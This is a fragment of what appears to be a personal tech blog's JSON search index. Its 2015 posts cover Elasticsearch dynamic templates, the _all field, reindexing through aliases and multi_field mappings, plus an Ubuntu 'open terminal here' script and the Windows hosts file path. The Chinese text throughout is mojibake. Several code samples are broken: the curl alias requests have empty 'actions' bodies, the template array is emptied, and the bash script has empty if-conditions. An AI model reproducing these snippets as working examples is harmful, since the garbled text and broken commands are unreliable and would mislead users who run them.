éœ€è¦ä¸€ä¸ªdateå­—æ®µï¼Œä½ éœ€è¦æ‰‹åŠ¨åœ°æ·»åŠ å®ƒã€‚NOTEESä¸­è¯†åˆ«æ—¥æœŸçš„æ–¹æ³•å¯ä»¥é€šè¿‡dynamic_date_formatsè®¾ç½®æ”¹å˜ã€‚dynamic_templatesé€šè¿‡dynamic_templatesï¼Œä½ å¯ä»¥æ‹¥æœ‰å¯¹æ–°å­—æ®µçš„åŠ¨æ€æ˜ å°„è§„åˆ™æ‹¥æœ‰å®Œå…¨çš„æ§åˆ¶ã€‚ä½ è®¾ç½®å¯ä»¥æ ¹æ®å­—æ®µåç§°æˆ–è€…ç±»å‹æ¥ä½¿ç”¨ä¸€ä¸ªä¸åŒçš„æ˜ å°„è§„åˆ™ã€‚æ¯ä¸ªæ¨¡æ¿éƒ½æœ‰ä¸€ä¸ªåå­—ï¼Œå¯ä»¥ç”¨æ¥æè¿°è¿™ä¸ªæ¨¡æ¿åšäº†ä»€ä¹ˆã€‚åŒæ—¶å®ƒæœ‰ä¸€ä¸ªmappingç”¨æ¥æŒ‡å®šå…·ä½“çš„æ˜ å°„ä¿¡æ¯ï¼Œå’Œè‡³å°‘ä¸€ä¸ªå‚æ•°(æ¯”å¦‚match)ç”¨æ¥è§„å®šå¯¹äºä»€ä¹ˆå­—æ®µéœ€è¦ä½¿ç”¨è¯¥æ¨¡æ¿ã€‚æ¨¡æ¿çš„åŒ¹é…æ˜¯æœ‰é¡ºåºçš„ - ç¬¬ä¸€ä¸ªåŒ¹é…çš„æ¨¡æ¿ä¼šè¢«ä½¿ç”¨ã€‚æ¯”å¦‚æˆ‘ä»¬å¯ä»¥ä¸ºstringå­—æ®µæŒ‡å®šä¸¤ä¸ªæ¨¡æ¿ï¼šesï¼šä»¥_esç»“å°¾çš„å­—æ®µåº”è¯¥ä½¿ç”¨spanishè§£æå™¨enï¼šå…¶å®ƒæ‰€æœ‰å­—æ®µä½¿ç”¨englishè§£æå™¨æˆ‘ä»¬éœ€è¦å°†esæ¨¡æ¿æ”¾åœ¨ç¬¬ä¸€ä¸ªï¼Œå› ä¸ºå®ƒç›¸æ¯”èƒ½å¤ŸåŒ¹é…æ‰€æœ‰å­—ç¬¦ä¸²å­—æ®µçš„enæ¨¡æ¿æ›´åŠ å…·ä½“ï¼šPUT /my_index{** â€œmappingsâ€: {**** â€œmy_typeâ€: {**** â€œdynamic_templatesâ€: **}}}match_mapping_typeå…è®¸ä½ åªå¯¹ç‰¹å®šç±»å‹çš„å­—æ®µä½¿ç”¨æ¨¡æ¿ï¼Œæ­£å¦‚æ ‡å‡†åŠ¨æ€æ˜ å°„è§„åˆ™é‚£æ ·ï¼Œæ¯”å¦‚stringï¼Œlongç­‰ã€‚matchå‚æ•°åªä¼šåŒ¹é…å­—æ®µåï¼Œpath_matchå‚æ•°ç”¨äºåŒ¹é…å¯¹è±¡ä¸­å­—æ®µçš„å®Œæ•´è·¯å¾„ï¼Œæ¯”å¦‚address.*.nameå¯ä»¥åŒ¹é…å¦‚ä¸‹å­—æ®µï¼š{** â€œaddressâ€ğŸ˜—*** â€œcityâ€ğŸ˜—*** â€œnameâ€: â€œNew Yorkâ€**** }**** }**}unmatchå’Œpath_unmatchæ¨¡å¼èƒ½å¤Ÿç”¨æ¥æ’é™¤æŸäº›å­—æ®µï¼Œæ²¡æœ‰è¢«æ’é™¤çš„å­—æ®µåˆ™ä¼šè¢«åŒ¹é…ã€‚æ›´å¤šçš„é…ç½®é€‰é¡¹å¯ä»¥åœ¨æ ¹å¯¹è±¡çš„å‚è€ƒæ–‡æ¡£ä¸­æ‰¾åˆ°ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"elasticSearch _all","slug":"history/tech/5953c4d0c2b92f5665eed9a7","date":"2015-12-25T04:47:30.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9a7/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9a7/","excerpt":"","text":"ElasticSearché»˜è®¤ä¸ºæ¯ä¸ªè¢«ç´¢å¼•çš„æ–‡æ¡£éƒ½å®šä¹‰äº†ä¸€ä¸ªç‰¹æ®Šçš„åŸŸ - â€˜_allâ€™ï¼Œå®ƒè‡ªåŠ¨åŒ…å«è¢«ç´¢å¼•æ–‡æ¡£ä¸­ä¸€ä¸ªæˆ–è€…å¤šä¸ªåŸŸä¸­çš„å†…å®¹ï¼Œ åœ¨è¿›è¡Œæœç´¢æ—¶ï¼Œå¦‚æœä¸æŒ‡æ˜è¦æœç´¢çš„æ–‡æ¡£çš„åŸŸï¼ŒElasticSearchåˆ™ä¼šå»æœç´¢_allåŸŸã€‚_allå¸¦æ¥æœç´¢æ–¹ä¾¿ï¼Œå…¶ä»£ä»·æ˜¯å¢åŠ äº†ç³»ç»Ÿåœ¨ç´¢å¼•é˜¶æ®µå¯¹CPUå’Œå­˜å‚¨ç©ºé—´èµ„æºçš„å¼€é”€ã€‚é»˜è®¤æƒ…å†µï¼ŒElasticSarchè‡ªåŠ¨ä½¿ç”¨_allæ‰€æœ‰çš„æ–‡æ¡£çš„åŸŸéƒ½ä¼šè¢«åŠ åˆ°_allä¸­è¿›è¡Œç´¢å¼•ã€‚å¯ä»¥ä½¿ç”¨&quot;_all&quot; : {â€œenabledâ€:false} å¼€å…³ç¦ç”¨å®ƒã€‚å¦‚æœæŸä¸ªåŸŸä¸å¸Œæœ›è¢«åŠ åˆ°_allä¸­ï¼Œå¯ä»¥ä½¿ç”¨ â€œinclude_in_allâ€:falseã€‚ä¾‹å¦‚ï¼šview plaincopyåœ¨CODEä¸ŠæŸ¥çœ‹ä»£ç ç‰‡æ´¾ç”Ÿåˆ°æˆ‘çš„ä»£ç ç‰‡{â€œpersonâ€: {â€œ_allâ€: { â€œenabledâ€: true }â€œpropertiesâ€: {â€œnameâ€: {â€œtypeâ€: â€œobjectâ€,â€œdynamicâ€: false,â€œpropertiesâ€: {â€œfirstâ€: {â€œtypeâ€: â€œstringâ€,â€œstoreâ€: true,â€œinclude_in_allâ€: false},â€œlastâ€: {â€œtypeâ€: â€œstringâ€,â€œindexâ€: â€œnot_analyzedâ€}}},â€œaddressâ€: {â€œtypeâ€: â€œobjectâ€,â€œinclude_in_allâ€: false,â€œpropertiesâ€: {â€œfirstâ€: {â€œpropertiesâ€: {â€œlocationâ€: {â€œtypeâ€: â€œstringâ€,â€œstoreâ€: true,â€œindex_nameâ€: â€œfirstLocationâ€}}},â€œlastâ€: {â€œpropertiesâ€: {â€œlocationâ€: {â€œtypeâ€: â€œstringâ€}}}}},â€œsimple1â€: {â€œtypeâ€: â€œlongâ€,â€œinclude_in_allâ€: true},â€œsimple2â€: {â€œtypeâ€: â€œlongâ€,â€œinclude_in_allâ€: false}}}}æŸ¥è¯¢æ—¶ï¼Œ_allå’Œå…¶å®ƒåŸŸä¸€æ ·ä½¿ç”¨ï¼šview plaincopyåœ¨CODEä¸ŠæŸ¥çœ‹ä»£ç ç‰‡æ´¾ç”Ÿåˆ°æˆ‘çš„ä»£ç ç‰‡GET /profiles/_search{â€œqueryâ€: {â€œmatchâ€: {â€œ_allâ€: â€œfoodâ€}}}æˆ–è€…åœ¨ä¸æä¾›æœç´¢åŸŸçš„æƒ…å†µä¸‹ï¼Œé»˜è®¤ä¼šæœç´¢_allï¼Œä¾‹å¦‚ï¼šview plaincopyåœ¨CODEä¸ŠæŸ¥çœ‹ä»£ç ç‰‡æ´¾ç”Ÿåˆ°æˆ‘çš„ä»£ç ç‰‡GET /profiles/_search{â€œqueryâ€: {â€œquery_stringâ€: {â€œqueryâ€: â€œfoodâ€}}}","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"Elasticsearchçš„mapping","slug":"history/tech/5953c4d0c2b92f5665eed9a6","date":"2015-12-25T03:59:14.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9a6/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9a6/","excerpt":"","text":"Elasticsearchçš„mappingä¸€æ—¦åˆ›å»ºï¼Œåªèƒ½å¢åŠ å­—æ®µï¼Œè€Œä¸èƒ½ä¿®æ”¹å·²ç»mappingçš„å­—æ®µã€‚ä½†ç°å®å¾€å¾€å¹¶éå¦‚æ­¤å•Šï¼Œæœ‰æ—¶å¢åŠ ä¸€ä¸ªå­—æ®µï¼Œå°±å¥½åƒæ‰“äº†ä¸€ä¸ªè¡¥ä¸ï¼Œä¸€ä¸ªå¯ä»¥ï¼Œä½†æ˜¯è¶Šè¡¥è¶Šå¤šï¼Œæœ€åè‡ªå·±éƒ½è§‰å¾—æƒ¨ä¸å¿ç¹äº†ã€‚æ€ä¹ˆåŠï¼Ÿï¼Ÿè¿™é‡Œæœ‰ä¸€ä¸ªæ–¹æ³•ä¿®æ”¹mappingï¼Œé‚£å°±æ˜¯é‡æ–°å»ºç«‹ä¸€ä¸ªindexï¼Œç„¶ååˆ›å»ºä¸€ä¸ªæ–°çš„mappingã€‚ä½ å¯èƒ½ä¼šé—®ï¼Œè¿™è¦æ˜¯åœ¨ç”Ÿäº§ç¯å¢ƒï¼Œå¯è¡Œå—ï¼Ÿç­”æ¡ˆæ˜¯ï¼Œå¦‚æœä½ ä¸€å¼€å§‹å°±é‡‡å–äº†åˆé€‚çš„è®¾è®¡ï¼Œè¿™ä¸ªå®Œå…¨æ˜¯å¯ä»¥åšåˆ°å¹³æ»‘è¿‡æ¸¡çš„ã€‚é‡‡å–ä»€ä¹ˆåˆç†è®¾è®¡å‘¢ï¼Ÿå°±æ˜¯æˆ‘ä»¬çš„ç¨‹åºè®¿é—®ç´¢å¼•åº“æ—¶ï¼Œå§‹ç»ˆä½¿ç”¨åŒä¹‰è¯æ¥è®¿é—®ï¼Œè€Œä¸è¦ä½¿ç”¨çœŸæ­£çš„indexNameã€‚åœ¨reindexå®Œæ•°æ®ä¹‹åï¼Œä¿®æ”¹ä¹‹å‰çš„åŒä¹‰è¯å³å¯ã€‚æ˜ç™½äº†å—ï¼Ÿå‚è€ƒä¸Šé¢çš„æ€è·¯ï¼Œæˆ‘ä»¬æ¥ä¸€æ­¥ä¸€æ­¥åšã€‚step1ã€åˆ›å»ºä¸€ä¸ªç´¢å¼•ï¼Œè¿™ä¸ªç´¢å¼•çš„åç§°æœ€å¥½å¸¦ä¸Šç‰ˆæœ¬å·ï¼Œæ¯”å¦‚my_index_v1,my_index_v2ç­‰ã€‚step2ã€åˆ›å»ºä¸€ä¸ªæŒ‡å‘æœ¬ç´¢å¼•çš„åŒä¹‰è¯ã€‚curl -XPOST localhost:9200/_aliases -d â€™{â€œactionsâ€:}â€™æ­¤æ—¶ï¼Œä½ å¯ä»¥é€šè¿‡åŒä¹‰è¯my_indexè®¿é—®ã€‚åŒ…æ‹¬åˆ›å»ºç´¢å¼•ï¼Œåˆ é™¤ç´¢å¼•ç­‰ã€‚step3ï¼Œéœ€æ±‚æ¥äº†ï¼Œéœ€è¦æ›´æ”¹mappingäº†ï¼Œæ­¤æ—¶ï¼Œä½ éœ€è¦åˆ›å»ºä¸€ä¸ªæ–°çš„ç´¢å¼•ï¼Œæ¯”å¦‚åç§°å«my_index_v2ï¼ˆç‰ˆæœ¬å‡çº§ï¼‰.ï¼Œåœ¨è¿™ä¸ªç´¢å¼•é‡Œé¢åˆ›å»ºä½ æ–°çš„mappingç»“æ„ã€‚ç„¶åï¼Œå°†æ–°çš„æ•°æ®åˆ·å…¥æ–°çš„indexé‡Œé¢ã€‚åœ¨åˆ·æ•°æ®çš„è¿‡ç¨‹ä¸­ï¼Œä½ å¯èƒ½æƒ³åˆ°ç›´æ¥ä»è€çš„indexä¸­å–å‡ºæ•°æ®ï¼Œç„¶åæ›´æ”¹ä¸€ä¸‹æ ¼å¼å³å¯ã€‚å¦‚ä½•éå†æ‰€æœ‰çš„è€çš„indexæ•°æ®ï¼Œè¯·å‚è€ƒ è¿™é‡Œ ã€‚step4ï¼Œä¿®æ”¹åŒä¹‰è¯ã€‚å°†æŒ‡å‘v1çš„åŒä¹‰è¯ï¼Œä¿®æ”¹ä¸ºæŒ‡å‘v2ã€‚httpæ¥å£å¦‚ä¸‹ï¼šcurl -XPOST localhost:9200/_aliases -d â€™{â€œactionsâ€:}â€™step5ï¼Œåˆ é™¤è€çš„ç´¢å¼•ã€‚curl -XDELETE localhost:9200/my_index_v1é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰å‡ ä¸ªå…¶ä»–çš„æ–¹æ³•ä¹Ÿå¯ä»¥æ›´æ”¹mappingã€‚1ã€ä¿®æ”¹ç¨‹åºï¼Œæ·»åŠ å­—æ®µã€‚å°±æ˜¯è¯´ï¼Œä½ å¯ä»¥åœ¨mappingä¸­å¢åŠ ä¸€ä¸ªæ–°çš„å­—æ®µï¼Œç„¶åä½ å¯¹æ–°çš„å­—æ®µè¿›è¡Œè®¿é—®ç»Ÿè®¡æœç´¢ã€‚è¿™ä¸ªå°±è¦ä¿®æ”¹ä¸¤ä¸ªåœ°æ–¹ï¼Œä¸€ä¸ªæ˜¯ä¿®æ”¹mappingå¢åŠ å­—æ®µï¼Œè¿˜æœ‰å°±æ˜¯ä¿®æ”¹ä½ çš„ç¨‹åºï¼ŒæŠŠå­—æ®µæ”¹æˆæ–°çš„å­—æ®µã€‚2ã€æ›´æ”¹å­—æ®µç±»å‹ä¸ºmulti_fieldã€‚multi_fieldå…è®¸ä¸ºä¸€ä¸ªå­—æ®µè®¾ç½®å¤šä¸ªæ•°æ®ç±»å‹ã€‚åº”ç”¨multi_fieldçš„ä¸€ä¸ªæœ€å…¸å‹çš„åœºæ™¯æ˜¯ï¼šä¸€ä¸ªç±»å‹å®šä¹‰ä¸ºanalyedï¼Œè¿™ä¸ªå­—æ®µå¯ä»¥è¢«æœç´¢åˆ°ï¼Œä¸€ä¸ªç±»å‹å®šä¹‰ä¸ºä¸åˆ†è¯ï¼Œè¿™ä¸ªå­—æ®µç”¨äºæ’åºã€‚ä»»ä½•å­—æ®µéƒ½å¯ä»¥è¢«æ›´æ–°ä¸ºmulti_fieldï¼ˆç±»å‹ä¸ºobjectå’Œnestedçš„ç±»å‹é™¤å¤–ï¼‰ã€‚å‡è®¾ç°åœ¨æœ‰ä¸€ä¸ªå­—æ®µï¼Œåå­—å«createdï¼Œç±»å‹ç°åœ¨ä¸ºstringã€‚{ â€œcreatedâ€: { â€œtypeâ€: â€œstringâ€} }æˆ‘ä»¬å¯ä»¥å°†å®ƒå¢åŠ ä¸€ç§ç±»å‹ï¼Œä½¿ä»–æ—¢èƒ½è¢«å½“åšå­—ç¬¦ä¸²åˆèƒ½å½“åšæ—¥æœŸå‹ã€‚curl -XPUT localhost:9200/my_index/my_type/_mapping -d â€™{â€œmy_typeâ€: {â€œpropertiesâ€: {â€œcreatedâ€: {â€œtypeâ€: â€œmulti_fieldâ€,â€œfieldsâ€: {â€œcreatedâ€: { â€œtypeâ€: â€œstringâ€ },â€œdateâ€: { â€œtypeâ€: â€œdateâ€ }}}}}}â€™é‡‡ç”¨æ ‡å‡†çš„é‡å»ºç´¢å¼•æ–¹å¼çš„æ—¶å€™ï¼Œæˆ‘ä»¬æ¨èå¤§å®¶ä¸ºæ¯ä¸€ä¸ªtypeéƒ½å»ºç«‹ä¸€ä¸ªç´¢å¼•åŒä¹‰è¯ï¼Œå³ä¾¿åœ¨åŒä¸€ä¸ªç´¢å¼•åº“ä¸­çš„å¤šä¸ªtypeï¼Œä¹Ÿæ¨èä½¿ç”¨å»ºç«‹ä¸€ä¸ªåŒä¹‰è¯æ¥è®¿é—®ã€‚å³ä¸€ä¸ªindexé‡Œé¢åŒ…å«ä¸€ä¸ªtypeï¼Œå› ä¸ºåœ¨elasticsearchä¸­ï¼Œè·¨indexæŸ¥è¯¢æ•°æ®æ˜¯å¾ˆæ–¹ä¾¿çš„ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨reindexä¸€ä¸ªtypeåï¼Œç«‹å³å°†typeç”Ÿæ•ˆï¼Œè€Œä¸æ˜¯å°†indexä¸‹é¢æ‰€æœ‰çš„typeéƒ½é‡å»ºå®Œåï¼ŒåŒä¹‰è¯æ‰èƒ½ç”Ÿæ•ˆã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"Ubuntu æ€ä¹ˆåœ¨å³é”®æ·»åŠ æ‰“å¼€ç»ˆç«¯","slug":"history/tech/5953c4d0c2b92f5665eed9a5","date":"2015-12-25T02:48:37.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9a5/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9a5/","excerpt":"","text":"ä»¥å‰ç”¨è¿‡Linuxçš„Red Hatç‰ˆæœ¬ï¼Œå¯ä»¥åœ¨ä»»ä½•ç›®å½•ä¸‹å³é”®æ‰“å¼€ç»ˆç«¯ï¼Œå¾ˆæ˜¯æ–¹ä¾¿ã€‚ç°åœ¨æ”¹ç”¨Ubuntuï¼Œçªç„¶æ²¡äº†è¿™ä¸ªåŠŸèƒ½ï¼Œè§‰å¾—å¾ˆä¸æ–¹ä¾¿ï¼Œäºæ˜¯åœ¨ç½‘ä¸Šæœç´¢äº†è§£å†³æ–¹æ³•ï¼Œæœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥è¾¾åˆ°ç›®çš„ã€‚æ–¹æ³•ä¸€ï¼šæœç´¢nautilus-open-terminalå®‰è£…å‘½ä»¤è¡Œï¼šsudo apt-get install nautilus-open-terminalé‡æ–°åŠ è½½æ–‡ä»¶ç®¡ç†å™¨nautilus -qæˆ–æ³¨é”€å†ç™»å½•å³è¦ä½¿ç”¨æ–¹æ³•äºŒï¼šè¿›å…¥ä¸»ç›®å½•çš„.gnome2/nautilus-scriptsç›®å½•ã€‚æ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶åä»»æ„ï¼ˆè¿™ä¸ªæ–‡ä»¶åä¼šæ˜¾ç¤ºåœ¨å³é”®èœå•é‡Œï¼Œæœ€å¥½æ˜¯é€šä¿—æ˜“æ‡‚çš„ï¼Œæ¯”å¦‚â€œæ‰“å¼€ç»ˆç«¯â€æˆ–â€œopen-terminalâ€ï¼‰ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹ã€‚#!/bin/bash This script opens a gnome-terminal in the directory you select. Distributed under the terms of GNU GPL version 2 or later Install in ~/.gnome2/nautilus-scripts or ~/Nautilus/scripts You need to be running Nautilus 1.0.3+ to use scripts. When a directory is selected, go there. Otherwise go to current directory. If more than one directory is selected, show error.if ; thenset $NAUTILUS_SCRIPT_SELECTED_FILE_PATHSif ; thendestination=&quot;$1&quot; Go to fileâ€™s directory if itâ€™s a fileif ; thendestination=&quot;dirname &quot;$destination&quot;&quot;fielsezenity --error --title=â€œError - Open terminal hereâ€â€“text=â€œYou can only select one directory.â€exit 1fielsedestination=&quot;echo &quot;$NAUTILUS_SCRIPT_CURRENT_URI&quot; | sed 's/^file:////'&quot;fi Itâ€™s only possible to go to local directoriesif [ -n â€œecho &quot;$destination&quot; | grep '^+:'â€ ]; thenzenity --error --title=â€œError - Open terminal hereâ€â€“text=â€œOnly local directories can be used.â€exit 1ficd â€œ$destinationâ€exec x-terminal-emulatoræ·»åŠ å®Œåï¼ŒæŠŠæ­¤æ–‡ä»¶åŠ ä¸Šå¯æ‰§è¡Œçš„æƒé™ã€‚chmod +x æ–‡ä»¶ä»¥ä¸Šåªæ˜¯æ€»ç»“çš„åˆ«äººçš„æ–¹æ³•ï¼Œæ–¹ä¾¿è‡ªå·±ä½¿ç”¨ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"elasticsearch multi field type","slug":"history/tech/5953c4d0c2b92f5665eed9ab","date":"2015-12-24T20:44:21.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9ab/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9ab/","excerpt":"","text":"multi_fieldç±»å‹å…è®¸æ˜ å°„ä¸ºå‡ ä¸ªæœ‰ç›¸åŒå€¼çš„core_typesã€‚è¿™æ ·å°±å¾ˆæ–¹ä¾¿ï¼Œä¾‹å¦‚ï¼Œå½“æƒ³è¦æ˜ å°„ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹ï¼Œå®ƒåˆ†æçš„æ—¶å€™æ—¢å¯ä»¥ä¸åˆ†æå­—ç¬¦ä¸²ï¼Œåˆå¯ä»¥åˆ†æå­—ç¬¦ä¸²ã€‚å®ç°äº†ä¸€å¯¹å¤šçš„å…³ç³»ã€‚ä¾‹å¦‚ï¼Œå­—ç¬¦ä¸²â€abc defâ€,ä¸åˆ†æçš„æ—¶å€™ä¸ºâ€abc defâ€ï¼Œåˆ†æçš„æ—¶å€™å°±ä¸ºâ€abcâ€,â€defâ€.{â€œtweetâ€ : {â€œpropertiesâ€ : {â€œnameâ€ : {â€œtypeâ€ : â€œmulti_fieldâ€,â€œfieldsâ€ : {â€œnameâ€ : {â€œtypeâ€ : â€œstringâ€, â€œindexâ€ : â€œanalyzedâ€},â€œuntouchedâ€ : {â€œtypeâ€ : â€œstringâ€, â€œindexâ€ : â€œnot_analyzedâ€}}}}}}ä¸Šé¢çš„ä¾‹å­æ˜¾ç¤ºname å­—æ®µå¦‚ä½•å®ç°multi_fieldã€‚å®ƒæ˜¯ä¸€ä¸ªç®€å•çš„å­—ç¬¦ä¸²ç±»å‹ï¼Œå®ƒè¢«æ˜ å°„äº†2æ¬¡ã€‚ä¸€æ¬¡è¢«analyzed ä¸ºnameï¼Œä¸€æ¬¡è¢«not_analyzed ä¸ºuntouched.accessing fields è®¿é—®å­—æ®µå½“multi_fieldæ˜ å°„ï¼Œå…·æœ‰ç›¸åŒçš„åç§°å±æ€§çš„å­—æ®µè¢«è§†ä¸ºå®ƒæ²¡æœ‰è¢«æ˜ å°„ä¸ºmulti fieldã€‚é‚£æ˜¯ä¸€ä¸ªé»˜è®¤å­—æ®µï¼Œå®ƒå¯ä»¥å®šæœŸè®¿é—®ï¼Œä¾‹å¦‚ä½¿ç”¨åç§°æˆ–ä½¿ç”¨ç±»å‹çš„å¯¼èˆªtweet.nameã€‚pathå±æ€§å¯ä»¥æ§åˆ¶éé»˜è®¤å­—æ®µå¦‚ä½•å¯ä»¥è¢«è®¿é—®ã€‚å¦‚æœè·¯å¾„å±æ€§è®¾ç½®ä¸ºfullï¼Œè¿™æ˜¯é»˜è®¤è®¾ç½®ï¼Œæ‰€æœ‰éé»˜è®¤çš„å‰ç¼€å­—æ®µæ˜¯å±æ€§çš„åç§°ï¼Œå¯ä»¥é€šè¿‡å®ƒä»¬çš„å®Œæ•´è·¯å¾„ä½¿ç”¨å¯¼èˆªç¬¦å·è®¿é—®ï¼šname.untouchedï¼Œæˆ–ä½¿ç”¨å¯¼èˆªç±»å‹çš„ç¬¦å·tweet.name.untouchedã€‚å¦‚æœpathçš„å±æ€§è®¾ç½®ä¸ºjust_name,å®é™…ä¸Šè¯¥å­—æ®µçš„å‰ç¼€æ²¡æœ‰è¢«ä½¿ç”¨ã€‚just_nameè®¾ç½®ï¼Œå…¶ä¸­åŒ…æ‹¬å¤šå­—æ®µçš„ç´¢å¼•å†…å®¹å…è®¸ç”¨ç›¸åŒçš„åå­—ã€‚ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œfirst_name å’Œ last_name å­—æ®µçš„å†…å®¹å¯ä»¥è¢«any_nameæˆ– tweet.any_nameè®¿é—®ã€‚{â€œtweetâ€ : {â€œpropertiesâ€: {â€œfirst_nameâ€: {â€œtypeâ€: â€œmulti_fieldâ€,â€œpathâ€: â€œjust_nameâ€,â€œfieldsâ€: {â€œfirst_nameâ€: {â€œtypeâ€: â€œstringâ€, â€œindexâ€: â€œanalyzedâ€},â€œany_nameâ€: {â€œtypeâ€: â€œstringâ€,â€œindexâ€: â€œanalyzedâ€}}},â€œlast_nameâ€: {â€œtypeâ€: â€œmulti_fieldâ€,â€œpathâ€: â€œjust_nameâ€,â€œfieldsâ€: {â€œlast_nameâ€: {â€œtypeâ€: â€œstringâ€, â€œindexâ€: â€œanalyzedâ€},â€œany_nameâ€: {â€œtypeâ€: â€œstringâ€,â€œindexâ€: â€œanalyzedâ€}}}}}}include in allThe include_in_all setting on the â€œdefaultâ€ field allows to control if the value of the field should be included in the _all field. Note, the value of the field is copied to _all, not the tokens. So, it only makes sense to copy the field value once. Because of this, the include_in_all setting on all non-default fields is automatically set to false and canâ€™t be changed.å¦‚æœå­—æ®µçš„å€¼åŒ…å«_allå­—æ®µï¼Œinclude_in_allè®¾ç½®åœ¨é»˜è®¤å­—æ®µæ—¶ï¼Œå…è®¸æ§åˆ¶ã€‚æ³¨æ„ï¼Œå­—æ®µçš„å€¼è¢«æ‹·è´åˆ°_all,æ²¡æœ‰åˆ†è¯ã€‚æ‰€ä»¥ï¼Œå®ƒæ‰æ˜¯æœ‰æ„ä¹‰çš„æ‹·è´å­—æ®µå€¼ã€‚å› æ­¤ï¼Œinclude_in_all è®¾ç½®åœ¨æ‰€æœ‰non-default å­—æ®µæ˜¯è‡ªåŠ¨è®¾ç½®ä¸ºfalseï¼Œè€Œä¸”ä¸èƒ½æ”¹å˜ã€‚mergingWhen updating mapping definition using the put_mapping API, a core type mapping can be â€œupgradedâ€ to a multi_field mapping. This means that if the old mapping has a plain core type mapping, the updated mapping for the same property can be a multi_field type, with the default field being the one being replaced.å½“ä½¿ç”¨put_mapping APIæ›´æ–°æ˜ å°„æ—¶ï¼Œä¸€ä¸ªcore ç±»å‹æ˜ å°„å¯ä»¥è¢«â€æ›´æ–°â€åœ¨ä¸€ä¸ªmulti_field æ˜ å°„ä¸Šã€‚è¿™æ„å‘³ç€ï¼Œå¦‚æœè€çš„æ˜ å°„æœ‰ä¸€ä¸ªæ™®é€šçš„æ ¸å¿ƒç±»å‹(core type)æ˜ å°„ï¼Œæ›´æ–°ä¸ºmulti_fieldç±»å‹æ—¶ï¼Œcore typeä½œä¸ºmulti_fieldé»˜è®¤å­—æ®µ ã€‚å‚è€ƒæ–‡ç« ï¼šhttp://www.elasticsearch.org/guide/en/elasticsearch/reference/current/mapping-multi-field-type.htmlæœ¬æ–‡å›ºå®šé“¾æ¥: http://www.chepoo.com/elasticsearch-multi-field-type.html | ITæŠ€æœ¯ç²¾åç½‘","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"hosts æ–‡ä»¶ä½ç½®","slug":"history/tech/5953c4d0c2b92f5665eed9aa","date":"2015-12-24T19:40:24.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9aa/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9aa/","excerpt":"","text":"ä¾æ¬¡åŒå‡»æ‰“å¼€â€œwindowsâ€â†’â€œSystem32â€â†’â€œdriversâ€â†’â€œetcâ€","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https:/